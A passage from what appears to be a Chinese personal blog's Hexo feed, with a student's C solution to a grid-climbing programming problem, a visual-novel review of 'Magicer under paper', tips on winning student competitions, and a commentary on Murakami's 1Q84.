class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="走楼梯"><a href="#走楼梯" class="headerlink" title="走楼梯"></a>走楼梯</h1><blockquote><p>kay小时候无聊的时候最喜欢爬楼梯了，当然他只喜欢向更高的楼梯爬。现在让你写一个程序，来判断他最多能爬多少步。假设起始点kay可以任意选择。并且显然kay只能选择上下左右进行爬。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"><span class="type">int</span> min=<span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> g_x,g_y;</span><br><span class="line"><span class="type">int</span> s_x,s_y;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> <span class="title function_">maxx</span><span class="params">(<span class="type">int</span> c,<span class="type">int</span> d)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(c&gt;d)&#123;</span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="type">int</span> max=<span class="number">0</span>;</span><br><span class="line"> g_x=<span class="number">0</span>,g_y=<span class="number">0</span>;</span><br><span class="line"> s_x=<span class="number">0</span>,s_y=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i][j]);</span><br><span class="line"><span class="keyword">if</span>(min&gt;a[i][j])&#123;</span><br><span class="line">min=a[i][j];</span><br><span class="line">s_x=i;</span><br><span class="line">s_y=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(max&lt;a[i][j])&#123;</span><br><span class="line">max=a[i][j];</span><br><span class="line">g_x=i;</span><br><span class="line">g_y=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;,min);</span></span><br><span class="line"><span class="comment">// find max</span></span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> max_sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">sum=find_goal(i,j,a[i][j]);</span><br><span class="line"><span class="keyword">if</span>(sum&gt;max_sum)&#123;</span><br><span class="line">max_sum=sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,max_sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">find_goal</span><span class="params">(x,y,now)</span>&#123;<span class="comment">// start to goal</span></span><br><span class="line"><span class="comment">// find_goal函数表示x,y坐标能找到的最大值 </span></span><br><span class="line"><span class="comment">// x,y is the set now ,now is the set_value before  </span></span><br><span class="line"><span class="type">int</span> step1,step2,step3,step4;</span><br><span class="line"><span class="keyword">if</span>(x&gt;n||x&lt;<span class="number">0</span>||y&gt;m||y&lt;<span class="number">0</span>||now&gt;a[x][y])&#123; <span class="comment">// now = before </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">now = a[x][y];</span><br><span class="line"><span class="keyword">if</span>(a[x<span class="number">-1</span>][y]&gt;now)</span><br><span class="line">step1 = find_goal(x<span class="number">-1</span>,y,now)+a[x<span class="number">-1</span>][y]-now;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">step1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a[x+<span class="number">1</span>]&gt;now)</span><br><span class="line">step2 = find_goal(x+<span class="number">1</span>,y,now)+a[x+<span class="number">1</span>][y]-now;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">step2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a[x][y<span class="number">-1</span>]&gt;now)</span><br><span class="line">step3 = find_goal(x,y<span class="number">-1</span>,now)+a[x][y<span class="number">-1</span>]-now;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">step3=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a[x][y+<span class="number">1</span>]&gt;now)</span><br><span class="line">step4 = find_goal(x,y+<span class="number">1</span>,now)+a[x][y+<span class="number">1</span>]-now;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">step4=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> tt= maxx(step1,maxx(step2,maxx(step3,step4)));</span><br><span class="line"><span class="comment">//printf(&quot;%d  &quot;,tt);</span></span><br><span class="line"><span class="keyword">return</span> tt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h1><p>都是咱大一的时候玩剩下的</p><p>现在反倒是忘记了</p><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><p>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getchar();  // 获取不需要的字符，如换行，空格等</span><br><span class="line">gets(ss); //获取一行</span><br><span class="line">scanf();</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> acm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>magicer under paper</title>
      <link href="/2022/08/30/magicer-under-paper/"/>
      <url>/2022/08/30/magicer-under-paper/</url>
      
        <content type="html"><![CDATA[<h1 id="纸上的魔法使"><a href="#纸上的魔法使" class="headerlink" title="纸上的魔法使"></a>纸上的魔法使</h1><p>闻所闻而来</p><p>这个UI做得很有意思，话说我也会做。</p><p>UI有一种精致的感觉，但是程序实现的难度不是很高，主要在于设计方面，用了很有趣的字体和布局。</p><p>比很多的会社都要用心，点名批评竹子社。</p><p>纸魔的cg和人物模型有点不一样，cg里面会画的比较幼，怪了。</p><h2 id="章节名称"><a href="#章节名称" class="headerlink" title="章节名称"></a>章节名称</h2><p>玩这个Gal，不大希望有人剧透，云玩家很干扰体验。</p><p>就是章节名称有些秀气。</p><ul><li>翡翠的排挤原理</li><li>红宝石的天作之合</li><li>蓝宝石的存在证明-缟玛瑙的不在证明</li><li>紫水晶的怪异传说</li><li>磷灰石的怠惰现象-黑榴石的死神花样</li><li>芙蓉石的与世隔绝</li><li>芙蓉石的终焉轮回（RIO END）RIO是日式人名的罗马音？理央</li><li>黑珍珠的求爱信号</li><li>萤石的时空残影</li><li>白珍珠的泡沫爱慕</li><li>萤石的怠惰现象（菲END）</li><li>绿幽灵水晶的命运连锁（白毛 END）</li><li>黑曜石的因果目录</li><li>青金石的幻想图书馆</li><li>璀璨的紫翠玉</li></ul><h1 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h1><p>魔法书，基础环境下的Boy meet girl 故事。</p><ul><li>魔法书本质上是类似愿望机的功能</li><li>魔法书和人是双向选择的</li><li>魔法书 宝石颜色越灰暗，表示故事越致郁</li></ul><h1 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h1><h3 id="白毛-臭傲娇"><a href="#白毛-臭傲娇" class="headerlink" title="白毛 臭傲娇"></a>白毛 臭傲娇</h3><p>出场毒舌，据我的经验，在之后的过程中的转变才是玩家最喜欢的</p><p>这样读书会腰酸背痛的，不舒服，但是好看。</p><p><img src="/magicer-under-paper/image-20220830201818448.png" alt="image-20220830201818448"></p><h3 id="粉毛"><a href="#粉毛" class="headerlink" title="粉毛"></a>粉毛</h3><p><img src="/magicer-under-paper/image-20220830210420596.png" alt="image-20220830210420596"></p><p><img src="/magicer-under-paper/image-20221001112832693.png" alt="image-20221001112832693"></p><p>什么TMD叫真女主呀！解释一下什么TMD叫真女主！粉毛捶地哭。</p><p>一人开三本书的含金量。</p><p>不过在《翡翠的排挤原理》的时候也有些交代的不合理记忆，但是魔法书的设定让人搞不清说的记忆情节究竟是魔法书的设定还是真实发生的。</p><h3 id="黑毛（感觉是路人）"><a href="#黑毛（感觉是路人）" class="headerlink" title="黑毛（感觉是路人）"></a>黑毛（感觉是路人）</h3><p><img src="/magicer-under-paper/image-20220830210902266.png" alt="image-20220830210902266"></p><h2 id="新英雄"><a href="#新英雄" class="headerlink" title="新英雄"></a>新英雄</h2><p><img src="/magicer-under-paper/image-20220926234326708.png" alt="image-20220926234326708"></p><p>画风突变的魔女风。全知全能角色</p><p><img src="/magicer-under-paper/image-20221001123108838.png" alt="image-20221001123108838"></p><p>气急败坏得炸毛了</p><p><img src="/magicer-under-paper/image-20221001124649586.png" alt="image-20221001124649586"></p><p>此处把宝石展示出来了，大概是紫水晶、白珍珠、翡翠、黑曜石、蓝水晶</p><h2 id="翡翠的排挤原理"><a href="#翡翠的排挤原理" class="headerlink" title="翡翠的排挤原理"></a>翡翠的排挤原理</h2><blockquote><p>主人公为了和男主有交集，装作处于霸凌，并成功的故事。</p></blockquote><p><img src="/magicer-under-paper/image-20220830230315977.png" alt="image-20220830230315977"></p><p>粉毛被霸凌，原因在于和她有关的人遭遇不幸</p><p>翻译用了一连串的排比，很有水平，有西式诗歌的感觉</p><blockquote><p>她云：和她接近的那谁……</p><p>她云：和她接近的那谁……</p><p>她云：和她接近的那谁……</p><p>她云：和她接近的那谁……</p></blockquote><p>本章的结尾是有暗示的，红毛在多年前和琉璃是有交际的。这点很重要。</p><h2 id="红宝石的天作之和"><a href="#红宝石的天作之和" class="headerlink" title="红宝石的天作之和"></a>红宝石的天作之和</h2><blockquote><p>男女主被天使做天作之和，射中了爱神之箭。。。</p></blockquote><p>这是假的魔法书</p><p>至于超自然元素是从哪里来的，大概是《潘多拉》的作用和白毛本来就是个臭傲娇的原因。</p><h2 id="蓝宝石的存在证明"><a href="#蓝宝石的存在证明" class="headerlink" title="蓝宝石的存在证明"></a>蓝宝石的存在证明</h2><blockquote><p>女主被世界遗忘，只被男主记得；随着情节的发展，被男主忘记；终章是男主找回记忆，happy end。</p></blockquote><p>灾难之始，万恶之源。</p><h2 id="缟玛瑙的不在证明"><a href="#缟玛瑙的不在证明" class="headerlink" title="缟玛瑙的不在证明"></a>缟玛瑙的不在证明</h2><h2 id="紫水晶的怪异传说"><a href="#紫水晶的怪异传说" class="headerlink" title="紫水晶的怪异传说"></a>紫水晶的怪异传说</h2><blockquote><p>幽灵被主人公发现，完成愿望，升天。</p></blockquote><p>红毛又来了，基本是和《翡翠》相同的套路，红毛的执念很强。</p><p>红毛正式加入图书馆团队。</p><h2 id="磷灰石的怠惰现象"><a href="#磷灰石的怠惰现象" class="headerlink" title="磷灰石的怠惰现象"></a>磷灰石的怠惰现象</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 艺术鉴赏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how to win the champion</title>
      <link href="/2022/08/24/how-to-win-the-champion/"/>
      <url>/2022/08/24/how-to-win-the-champion/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>虽然标题起的很厉害，但是本人可是没有在任何一项国家级竞赛上面拿过一等。</p><p>区区二等和区区三等不值一提。</p><p>但是在本科生期间的很乐意，很情愿还是不情愿，不乐意，给拐去参加的些许竞赛的过程中，我还是摸清了一些固定的套路。</p><h1 id="队友"><a href="#队友" class="headerlink" title="队友"></a>队友</h1><p>有几点要讲，首先此处话语没有针对任何人，<del>我的意思是与我之大才相比，在座的各位都是一般般的水平。</del></p><p>就竞赛而言，按照目的分，可以分为练手的竞赛和真正要冲排名的竞赛。这两个目的一般不会放在同一个竞赛里面实现，除非有什么大才，否则会弄得很痛苦。</p><ul><li>小心导师给找的队友，谁用谁知道，里面的有一些成年人的原因，师弟要看年级，年纪比较低的一般不靠谱，但是师兄一般很靠谱。</li><li>小心同系且同年级选手，不小心就资敌了。</li><li>要素齐全。</li><li>分赃均衡</li></ul><h1 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h1><p>那什么做题竞赛就算了，多大的人了，还弄考试机器那一套，我厌了。</p><h2 id="求求你少做几页PPT吧！！！！"><a href="#求求你少做几页PPT吧！！！！" class="headerlink" title="求求你少做几页PPT吧！！！！"></a>求求你少做几页PPT吧！！！！</h2><p><img src="/2022/08/24/how-to-win-the-champion/image-20220824214958144.png" alt="image-20220824214958144"></p><h2 id="美观性"><a href="#美观性" class="headerlink" title="美观性"></a>美观性</h2><ul><li>字体大小均衡</li><li>可以套用模板，模板的风格和主题接近</li><li>没有经过训练的家伙做PPT能做出什么样子，我相信诸位都清楚，尤其不要相信高中生水平的PPT。</li><li>能放图不要放文字</li><li>文字尽量少而大</li><li>PPT是可以做成炫技一般的，就是一般人不会做而已。</li><li>参考PPT模板和讲法【[TV2] 为什么莉可丽丝超越小圆掀起了原创动画的革命【TV2 XJBTalk】】 <a href="https://www.bilibili.com/video/BV1TB4y147My?share_source=copy_web&amp;vd_source=9052d46a90459e2586b46cdaff2721d8">https://www.bilibili.com/video/BV1TB4y147My?share_source=copy_web&amp;vd_source=9052d46a90459e2586b46cdaff2721d8</a></li><li>可以参考所谓的雷式PPT，就是小米的发布会，这个PPT无论是美感还是讲法都是一流的。</li></ul><h2 id="逻辑性（三段式）"><a href="#逻辑性（三段式）" class="headerlink" title="逻辑性（三段式）"></a>逻辑性（三段式）</h2><ul><li>是什么</li><li>为什么</li><li>怎么做</li><li>有什么意义</li><li>要是讲完别人还在问，是什么，说明逻辑性做的很失败</li></ul><h2 id="讲述"><a href="#讲述" class="headerlink" title="讲述"></a>讲述</h2><ul><li>尽可能脱稿讲述，这不是什么病态的农耕时期的内卷，而是对讲述熟悉的表现。</li></ul><h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><ul><li>做PPT超过一天没给初稿的<strong>绝对在摸鱼</strong> ，无论什么理由，无论什么布局。拿我的眼界担保，PPT绝对不可能做的超过1天。</li><li>根据讲述中的问题，需要修改十个版本左右。</li></ul><h1 id="选题"><a href="#选题" class="headerlink" title="选题"></a>选题</h1><ul><li>突出一个蹭热点</li><li>新技术，新问题，大热点</li><li>创新点要新颖，但是要让人听懂</li></ul><h1 id="Know-whom-you-say-to"><a href="#Know-whom-you-say-to" class="headerlink" title="Know whom you say to"></a>Know whom you say to</h1><p>不同教育背景和不同的职业背景使得讲述对象的所谓三观不同，标准不同。但是不变的一点在于，要把事情讲清楚</p><h2 id="见人说人话，见鬼说鬼话"><a href="#见人说人话，见鬼说鬼话" class="headerlink" title="见人说人话，见鬼说鬼话"></a>见人说人话，见鬼说鬼话</h2><blockquote><p>这一点在我以前玩生物竞赛的时候就已经有深刻体会了。</p><p>教科书里面的东西不能全部放到竞赛里面，竞赛里面学到的东西千万不能全部写到考卷里面。</p><p>所谓产学研的割裂就是那么严重。</p></blockquote><ul><li>把事情讲清楚，无论是和人讲还是和鬼讲。都是讲的一件事。不同的不过是顾左右而言他。</li><li>不过是侧重点不同</li><li>对所谓专家讲技术，自然要突出技术，什么狗屁商业价值就算了。</li><li>对所谓商业投资人还是单纯的学院派感觉很会投资但是实际上不会投资的家伙。讲赚钱，讲包装，技术也要讲，但是不是那么重要了；技术方面需要讲得很朦胧有比较让人听懂，总之是需要有一个度的。</li></ul><h2 id="结合讲述时间"><a href="#结合讲述时间" class="headerlink" title="结合讲述时间"></a>结合讲述时间</h2><p>比如说上午还是下午，是不是要吃饭了，是不是大下午的犯困了。</p><p>做个竞赛和做保姆一样呢。</p><h1 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h1><ul><li><p>学术化的语言</p></li><li><p>个人觉得写个破文档还是很简单的</p></li><li><p>逻辑讲清楚</p></li><li><p>主要部分按照原因-方式-结果三段式讲话，就是所谓的总-分-总三段式。</p></li><li><p>表格名称在表格的上面，图片的名称在图片的下面。</p></li><li><p>凡是有图片的都算是图片，虽然画的和表格一样；</p></li><li><p>表格的定义是数据表，重点是数据，不是表格的形式。</p></li><li><p>但是，千万不能全部给小师弟做，这些家伙根本就没有审美水平</p></li><li><p>修不到10个version不要拿来见我</p></li><li><p>本人的修改文档水平可是高于自己写文档的水平的，虽然说在本科生期间没有怎么用到。</p></li></ul><h1 id="领导力or帝王学or屠龙术"><a href="#领导力or帝王学or屠龙术" class="headerlink" title="领导力or帝王学or屠龙术"></a>领导力or帝王学or屠龙术</h1><p>在本科生阶段小小一个4-5人，最多15人的团队里面 ，我是很不相信这种东西的。</p><p>小小一个不到5人的团队，搞出一套文官系统？我非常反感这类东西。</p><p>要是有人问有滥竽充数的家伙怎么办，我觉得换人，道不同不相为谋，人生有梦各自精彩。</p><p>所以说找到合适的人是win the champion的第一步，一带三什么的还是带不动的。</p><h2 id="关于领导力流派"><a href="#关于领导力流派" class="headerlink" title="关于领导力流派"></a>关于领导力流派</h2><p>可能管理学里面有多种流派</p><ul><li>最佳的管理学方法，和被管理者的学历水平是有关的。以下全部是我瞎说的，和正经的管理学没有什么关系</li><li>可能分为甲方型、产品经理型、实干型</li><li>甲方型：布置任务-检查成果，什么都不管。可能像是导师会干的事情</li><li>产品经理型：布置任务-设置人手-指导-检查成果。学生领导者，不过这里面做多做少都是有些讲究的。</li><li>实干型：领导+做事，是很苦逼的。一般要担当主力去做的，因为一般别人干的你自己不会满意。</li><li>个人一般是产品 经理型。可能是偏向不怎么管的类型。</li><li>我的观点是我导可以质疑我的管理学流派，但是不能质疑我的管理学水平。</li></ul><h1 id="不写了"><a href="#不写了" class="headerlink" title="不写了"></a>不写了</h1><p>竞赛的目的很重要，能力还是什么狗屁保研。都行</p><p>主要是目的要达到。</p><p>不然就是鸟学校的打工皇帝。</p><p>鸟学校卡我cet，这笔账我记下了。</p>]]></content>
      
      
      <categories>
          
          <category> 竞赛小结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1q84</title>
      <link href="/2022/08/23/1q84/"/>
      <url>/2022/08/23/1q84/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="1q84"><a href="#1q84" class="headerlink" title="1q84"></a>1q84</h1><p>开始研究村上春树了，很多年前，姑娘说”你读过挪威的森林吗“语气不大好，可能是“读”这个字说的要飘上天的语气罢，”我还真读过“。这姑娘很有趣，是本人所见有趣程度排名前几名的，不能说是第一。</p><p>是本书，村上春树写的。</p><p>实际的意思是1984，因为q和9很像嘛。</p><p>知道这点之后就可以像是考证了《阿Q正传》里面这个Q究竟是指什么，读什么 和小学生炫耀了呢。都是Q。</p><p>我至今都记得本人的中学语文老师和一帮初中生炫耀这个词是念gui，第四声，不是念Q，然后大加嘲讽，反正我印象不大好。实际上这样讲感觉那语文老师老太太有点像是孔乙己了，就只有欺负小孩的本事。</p><p>《1984》是什么乔治.奥威尔写的，讽刺苏联的小说，我还没有读过，道听途说，是书中有个叫做老大哥的集权政府，把人怎么样的思想压迫的。</p><p>思想压迫，就是真的又如何，主不在乎。说一句大逆不道的话，就是本国……</p><p>这一段可不兴讲呀。叫我网络巨人。</p><p>《1q84》 和 《1984》感觉都是想要讽刺些什么，《1q84》要讽刺邪教，搞不清？《1984》讽刺老大哥的什么集权政府。</p><h1 id="1q84讲了什么故事"><a href="#1q84讲了什么故事" class="headerlink" title="1q84讲了什么故事"></a>1q84讲了什么故事</h1><p>双线叙事结构，后期有三线。严格来说，这本书是所谓的异世界分类呢，带穿越的，不是架空世界，主要世界观和现实世界是相似的。<del>而像是每天上班谈恋爱，嘻嘻哈哈不加班什么的才是架空世界吧。</del></p><p>女主青豆一线，男主天吾一线，还有后期的侦探（真的能叫侦探吗？）牛河一线。</p><p>天吾是作家，数学教师，而青豆是健身教练，还有渣男杀手。</p><p>但也不是史密斯夫妇那种故事，写成史密斯夫妇这种故事实际上也是可行的。</p><p>两条故事线开始是平行的，后来开始汇聚。</p><h1 id="暗喻和隐喻"><a href="#暗喻和隐喻" class="headerlink" title="暗喻和隐喻"></a>暗喻和隐喻</h1><p>书中的隐喻和暗喻不少，具体指什么见仁见智吧。小小人，nhk，月亮，邪教，空气茧，子体，母体，几个人代表了什么，1q84这个世界又是什么，最后这两人究竟是否回到了真实的1984世界。</p><p>我看人均985博士的知乎里面说是，《1q84》里面的所有对天吾有好感的女性全部是青豆的子体，包括有老公的女朋友（信息量很大），小护士，还有深绘里。并且1q84世界只是天吾想象的世界，里面的真人只有天吾和青豆。更有甚者说是青豆都是假的，是天吾10岁开始产生的自由和反抗意识的具象。</p><p>但是从我多年来对日式剧本的了解，单纯作为boy meet girl 的角度解读，青豆必然是真的。</p><ul><li>nhk:大概是本国管理新闻和广播的那个喜欢禁动漫的那个神奇机构，应该叫广电罢，的生态位。nhk离线支付做的不好，信号是电视塔广播的，可能接收是没有设置权限。只能通过人工上门收取费用的方式接收。就出现了书中的nhk收费员这种职业。就说是无论有没有电视都要收这笔费用的流氓机构。这些信息是某留日博士讲给我的。反正这个机构给人感觉不好。</li><li>子体-母体：这和空气茧是有很大的关联的。这究竟暗示了什么呢？我的想法是不同时间中的同一主体。文中出现了几个子体-母体，就是多个幼女-教徒，青豆（幼年期）-青豆，有老公的女朋友，小护士，还有深绘里算是青豆的子体。那么青豆的子体就是有老公的女朋友（信息量很大）-小护士-深绘里-(幼年期)-青豆，那么多人。具有很高的时间间隔相似性。</li><li>小小人：就是所谓邪教的具象体现。文中有一句话：“从人类还未产生开始就存在的”。可以理解为从人类产生开始就存在了的邪教，就是什么巫医不分时期的巫师罢。</li><li>小小人有多项行为和邪教是相似的。比如：只能够在森林中不能出去，毕竟是不能见光的东西；可以指挥所谓的教主(就是现实的政治家)使得政治家获得特异功能(选票,人脉)；教主(政治家)一步一步被小小人(邪教)桎梏，就是教主被青豆杀的那个雷雨之夜的描述，逐渐痛苦，渴望解放；教主死亡，小小人失去了对现世的影响力，但是仍旧是有后续的”通道“的；还有最重要的一点，小小人是在最老的山羊的尸体嘴里面跑出来的，并被深绘里目击，由空气茧产生她的子体，这一段描述让我想起了”山羊“的恶魔意象和圣经里面玛丽亚处女怀胎。至于为什么把山羊作为恶魔象征，我没有研究过，可能是横瞳孔，不过山羊确实是臭的很。小小人和耶稣降生的关系：就是忽视过程看头和尾不就是完全一致吗。</li></ul><table><thead><tr><th align="center"></th><th align="center">耶稣降生</th><th align="center">生成子体</th><th align="center">一致性</th></tr></thead><tbody><tr><td align="center">在哪里</td><td align="center">在马棚</td><td align="center">在马棚</td><td align="center">完全一致</td></tr><tr><td align="center">有什么</td><td align="center">估计有马</td><td align="center">有羊的尸体</td><td align="center">基本一致</td></tr><tr><td align="center">产生了什么</td><td align="center">耶稣</td><td align="center">子体</td><td align="center">完全一致</td></tr><tr><td align="center">输入了什么</td><td align="center">玛丽亚</td><td align="center">深绘里</td><td align="center">完全一致</td></tr></tbody></table><ul><li>空气茧：无中生有得通过空气的丝线产生了子体。意味着邪教零成本得控制了所谓家长，进而控制了人类幼崽(空气茧产生了幼体，并控制了幼体，给教主不可描述)。</li></ul><h2 id="青豆和天吾的关系"><a href="#青豆和天吾的关系" class="headerlink" title="青豆和天吾的关系"></a>青豆和天吾的关系</h2><table><thead><tr><th align="center">青豆</th><th align="center">天吾</th></tr></thead><tbody><tr><td align="center">喜欢秃头，恋父</td><td align="center">喜欢年上，恋母</td></tr><tr><td align="center">没有学术成就</td><td align="center">是数学天才，小说家</td></tr><tr><td align="center">运动学教练，专业人士，垒球选手</td><td align="center">业余剑道</td></tr><tr><td align="center">被母亲拐去传教</td><td align="center">被父亲拐去收nhk费用</td></tr><tr><td align="center">社恐</td><td align="center">人生赢家面板</td></tr></tbody></table><p>男女主是按照几乎相反的面板捏的，有具有相似的经历。类似的现象还有深绘里-牛河的组合，就是世界最美面板和世界最丑面板。</p><p>所以说这两个人是同一个人的不同表现形式的观点是有一定的道理的。青豆是假的，是天吾10岁开始产生的自由和反抗意识的具象。</p><p>两人古怪的10岁开始的相互吸引力（像是百分百女孩-百分百男孩的说法，也是村上春树的一篇文章）  是对于自身完整性的追求。</p><p>青豆是不是真的这个问题要看是从 boy meet girl 的角度还是 求诸己的角度解读。</p><h1 id="性"><a href="#性" class="headerlink" title="性"></a>性</h1><p>村上春树写的书里面总是有些涉黄的东西。</p><p>《挪威的森林》里面也是这样，看那一本的时候年龄尚小，只是当作黄书来看的，我反省。还有一本别的作者写的《失乐园》写的更加多。</p><p>所谓的性，实际上可以作为一种符号，而不是单纯的三俗，这可以从政治经济哲学方面进行解释。这和Gal里面的性是相同的，虽然能够做到这点的gal很少。但是传统文学里面的性不能仅仅从读者爱看，作者爱写这点解释。</p><h2 id="gal中的性"><a href="#gal中的性" class="headerlink" title="gal中的性"></a>gal中的性</h2><p>在gal里面一般意义上，性是所谓Gal(girl and love)中的<strong>love</strong>的体现，可以作为是一种深度的交流，内心的交融。（我们已经是日后的交情了），需要用一种里程碑式的场景突出love。像是《末世孤雄》《9-nine》里面就做的不错，我有深刻的印象，其他的感觉不是很强烈，可能基本的感觉还是有的。</p><p>很多人把gal单纯当作黄油，我觉得是很不贴切的。但是不可言说，非常道也。</p><h2 id="1q84中的性"><a href="#1q84中的性" class="headerlink" title="1q84中的性"></a>1q84中的性</h2><p>讲不清。可能是类似《失乐园》的感觉吧。</p><h1 id="究竟有没有回到1984"><a href="#究竟有没有回到1984" class="headerlink" title="究竟有没有回到1984"></a>究竟有没有回到1984</h1>]]></content>
      
      
      <categories>
          
          <category> 艺术鉴赏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文学 </tag>
            
            <tag> 村上春树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gal appreciate Purple</title>
      <link href="/2022/08/23/gal-appreciate-purple/"/>
      <url>/2022/08/23/gal-appreciate-purple/</url>
      
